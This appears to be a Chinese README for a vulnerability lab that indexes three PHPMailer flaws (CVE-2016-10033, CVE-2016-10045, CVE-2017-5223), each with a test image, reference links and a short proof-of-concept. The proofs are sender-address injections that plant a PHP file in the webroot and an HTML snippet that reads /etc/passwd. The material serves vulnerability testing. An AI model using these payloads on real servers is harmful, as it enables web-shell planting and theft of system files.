### CVE-2016-10033 - PHPMailer < 5.2.18 Remote Code Execution

测试镜像

* src/phpmailer/5.2.17/

参考链接

* [PHPMailer 命令执行漏洞（CVE-2016-10033）分析](https://blog.chaitin.cn/phpmailer-cve-2016-10033/)

Poc - from 头

```
a( -OQueueDirectory=/tmp -X/var/www/html/y.php )@qq.com
```

### CVE-2016-10045 - PHPMailer < 5.2.20 Remote Code Execution / escapeshell bypass

测试镜像

* src/phpmailer/5.2.17/

参考链接

* [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)

Poc - from 头

```
a'( -OQueueDirectory=/tmp -X/var/www/html/x.php )@qq.com
```

### attachment 任意文件读取特性 

测试镜像

* src/phpmailer/5.2.21/

影响版本

* <= 5.2.21

参考链接

* [PHPMailer任意文件读取漏洞分析（CVE-2017-5223）](http://www.freebuf.com/vuls/124820.html)

Poc - 在邮件正文里使用 `<img>` 标签，获取任意文件

```
$mail->AddAttachment('test.txt', 'test.txt');
$mail->IsHTML(true);
$msg="<img src='/etc/passwd'>test";
$mail->msgHTML($msg);
```


